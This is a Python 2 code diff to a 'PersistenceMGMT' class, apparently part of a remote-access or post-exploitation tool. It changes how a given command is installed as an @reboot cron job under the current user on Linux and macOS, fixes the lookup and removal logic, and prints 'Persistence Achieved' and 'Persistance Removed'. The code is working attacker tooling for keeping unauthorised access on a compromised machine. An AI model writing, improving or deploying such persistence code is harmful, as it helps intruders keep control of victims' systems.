@@ -1,4 +1,5 @@
 import platform
+from getpass import getuser
 from crontab import CronTab
 
 
@@ -22,19 +23,25 @@ class PersistenceMGMT(object):
         pass
 
     def darwin(self, command, delete=False):
-        if not delete:
-            self.linux(command)
+        self.linux(command, delete)
+
 
     def linux(self, command, delete=False):
-        cron = CronTab(user='root')
-        if not delete and not cron.find_command(command):
+        user = getuser()
+        cron = CronTab(user=user)
+        try:
+            job = next(cron.find_command(command))
+        except StopIteration, e:
+            job = False
+        if not delete and not job:
             job = cron.new(command=command)
             job.every_reboot()
             print "[+] Persistence Achieved"
         elif delete:
-            job = cron.find_command(command)
+            job = next(cron.find_command(command))
             cron.remove(job)
-        cron.write()
+            print "[-] Persistance Removed"
+        cron.write_to_user(user=user)
 
     def persist(self, arg):
         self.method(arg)
